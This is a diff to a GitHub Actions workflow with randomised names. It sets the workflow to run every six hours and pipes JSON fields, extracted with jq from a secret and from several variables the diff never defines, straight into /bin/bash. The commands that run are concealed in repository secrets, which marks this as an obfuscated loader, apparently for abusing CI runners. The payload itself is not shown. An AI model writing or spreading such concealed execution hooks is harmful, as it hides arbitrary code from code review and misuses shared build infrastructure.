@@ -1,9 +1,8 @@
 name: dongkuangyu7654
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '52 4/6 * * *'
+    - cron: '26 1/6 * * *'
 
 jobs:
   build:
@@ -12,11 +11,15 @@ jobs:
       - uses: actions/checkout@v4
       - name: dongkuangyu7654
         env:
-          ykhs7230: ${{ secrets.ykhs7230 }}
+          das270: ${{ secrets.das270 }}
         run: |
-          echo $ykhs7230 | jq -r .s50574 | /bin/bash
-          echo $r00264 | jq -r .lspe47926 | /bin/bash
-          echo $lhe30130 | jq -r .nkzv8945 | /bin/bash
-          echo $mpg0197 | jq -r .k134 | /bin/bash
-          echo $hvgld128 | jq -r .jqnow4 | /bin/bash
+          echo $das270 | jq -r .n8286 | /bin/bash
+          echo $btx4553 | jq -r .dqgy696 | /bin/bash
+          echo $o0 | jq -r .e242 | /bin/bash
+          echo $x626 | jq -r .laa3728 | /bin/bash
+          echo $qpbsf52672 | jq -r .lbm24844 | /bin/bash
+          echo $am8408 | jq -r .bw116 | /bin/bash
+          echo $ycada6428 | jq -r .cmo1715 | /bin/bash
+          echo $zxiim6 | jq -r .cjepk4921 | /bin/bash
+          echo $zin0485 | jq -r .nmgga99 | /bin/bash
 
